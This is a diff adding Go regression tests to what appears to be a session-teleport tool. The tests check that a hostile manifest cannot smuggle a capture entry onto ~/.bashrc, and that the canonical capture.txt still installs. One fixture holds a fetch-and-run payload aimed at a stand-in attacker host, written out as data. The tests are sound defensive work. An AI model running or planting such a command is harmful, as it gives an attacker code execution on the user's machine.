@@ -9,6 +9,7 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/mithro/go-claude-teleport/internal/job"
 	"github.com/mithro/go-claude-teleport/internal/session"
 )
 
@@ -583,4 +584,151 @@ func TestInstallForceOverwritesDivergedSessionFile(t *testing.T) {
 			t.Fatalf("err = %v, want a refusal naming %s", err, m.Entries[1].Dst)
 		}
 	})
+}
+
+// TestInstallRefusesSmuggledCaptureDst is the full end-to-end PoC for
+// ruling R-P3-B1b (the wave B re-review's residual B1 finding): a hostile
+// or buggy source builds a manifest with a Deferred CatCapture entry whose
+// Dst is ~/.bashrc, staging attacker-controlled bytes under that entry's
+// id. Before this fix, Diff's Deferred branch skipped the Lstat of Dst
+// entirely (classifying staged-same) and Install's "only capture may be
+// deferred" gate let CatCapture straight through, so placeEntry renamed the
+// staged bytes over ~/.bashrc. The destination now re-derives the ONE
+// legitimate capture Dst for this job — job.Dir(DataDir, jobID)/capture.txt
+// — and refuses anything else in both Diff and Install, leaving ~/.bashrc
+// byte-identical and naming the offending entry in the error.
+func TestInstallRefusesSmuggledCaptureDst(t *testing.T) {
+	home := t.TempDir()
+	if err := os.MkdirAll(home, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
+	p := session.Paths{
+		Home:       home,
+		ConfigDir:  filepath.Join(home, ".claude"),
+		GlobalJSON: filepath.Join(home, ".claude.json"),
+		DataDir:    dataDir,
+	}
+	jobID := "22222222-2222-4222-8222-222222222222"
+	staging := job.StagingDir(dataDir, jobID)
+
+	bashrc := filepath.Join(home, ".bashrc")
+	rc := "# the user's own shell rc\n"
+	if err := os.WriteFile(bashrc, []byte(rc), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	payload := "curl evil.example | sh\n"
+
+	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
+	m.Entries = []Entry{{
+		ID: 0, Category: session.CatCapture, Dst: bashrc,
+		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload), Deferred: true,
+	}}
+	writeFile(t, StagedPath(staging, 0), payload)
+
+	st, err := Diff(context.Background(), m, staging)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st[0] != PresentDifferent {
+		t.Fatalf("Diff classified the smuggled capture entry %s, want %s", st[0], PresentDifferent)
+	}
+
+	_, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
+	if err == nil || !strings.Contains(err.Error(), bashrc) {
+		t.Fatalf("Install err = %v, want a refusal naming %s", err, bashrc)
+	}
+	got, err := os.ReadFile(bashrc)
+	if err != nil || string(got) != rc {
+		t.Fatalf("%s must survive byte-identical: got %q err=%v", bashrc, got, err)
+	}
+}
+
+// TestInstallRefusesCaptureDstEvenWithHostileStatusMap is Install's own
+// independent half of the same defense (mirrors
+// TestInstallRefusesSmuggledDeferredEntry): even a hostile status map that
+// claims staged-same for every entry — bypassing Diff's own refusal
+// entirely — must not get a CatCapture entry with a non-canonical Dst
+// installed. Covered for both Deferred and non-Deferred entries: the
+// canonical-Dst check in validateDst does not depend on the flag.
+func TestInstallRefusesCaptureDstEvenWithHostileStatusMap(t *testing.T) {
+	for _, deferred := range []bool{true, false} {
+		t.Run(map[bool]string{true: "deferred", false: "not deferred"}[deferred], func(t *testing.T) {
+			m, staging, p := staged(t)
+			victim := 2 // a plain session-category file, repurposed as the attack entry
+			if !m.Entries[victim].IsRegular() {
+				t.Fatalf("fixture entry %d is not a plain file: %+v", victim, m.Entries[victim])
+			}
+			if err := os.MkdirAll(p.Home, 0o700); err != nil {
+				t.Fatal(err)
+			}
+			bashrc := filepath.Join(p.Home, ".bashrc")
+			rc := "# the user's own shell rc\n"
+			if err := os.WriteFile(bashrc, []byte(rc), 0o600); err != nil {
+				t.Fatal(err)
+			}
+			m.Entries[victim].Category = session.CatCapture
+			m.Entries[victim].Dst = bashrc
+			m.Entries[victim].Deferred = deferred
+
+			st := map[int]Status{}
+			for _, e := range m.Entries {
+				st[e.ID] = StagedSame
+			}
+			_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
+			if err == nil || !strings.Contains(err.Error(), bashrc) || !strings.Contains(err.Error(), "capture") {
+				t.Fatalf("err = %v, want a capture-entry refusal naming %s", err, bashrc)
+			}
+			got, _ := os.ReadFile(bashrc)
+			if string(got) != rc {
+				t.Errorf("%s was modified: %q", bashrc, got)
+			}
+		})
+	}
+}
+
+// TestInstallInstallsCanonicalCaptureEntry proves the fix does not break
+// the legitimate flow end-to-end: a manifest whose CatCapture entry's Dst
+// IS job.Dir(DataDir, jobID)/capture.txt installs normally via Diff+Install
+// (the plain file-install path, judged only against staging, per Entry's
+// own doc comment).
+func TestInstallInstallsCanonicalCaptureEntry(t *testing.T) {
+	home := t.TempDir()
+	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
+	p := session.Paths{
+		Home:       home,
+		ConfigDir:  filepath.Join(home, ".claude"),
+		GlobalJSON: filepath.Join(home, ".claude.json"),
+		DataDir:    dataDir,
+	}
+	jobID := "44444444-4444-4444-8444-444444444444"
+	staging := job.StagingDir(dataDir, jobID)
+	capDst := filepath.Join(job.Dir(dataDir, jobID), "capture.txt")
+	payload := "$ claude\n> hello\n"
+
+	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
+	m.Entries = []Entry{{
+		ID: 0, Category: session.CatCapture, Dst: capDst,
+		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload), Deferred: true,
+	}}
+	writeFile(t, StagedPath(staging, 0), payload)
+
+	st, err := Diff(context.Background(), m, staging)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st[0] != StagedSame {
+		t.Fatalf("status = %s, want %s", st[0], StagedSame)
+	}
+	rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
+	if err != nil {
+		t.Fatalf("Install: %v", err)
+	}
+	if rep.Installed != 1 {
+		t.Errorf("report = %+v, want Installed 1", rep)
+	}
+	got, err := os.ReadFile(capDst)
+	if err != nil || string(got) != payload {
+		t.Fatalf("capture.txt not installed correctly: got %q err=%v", got, err)
+	}
 }
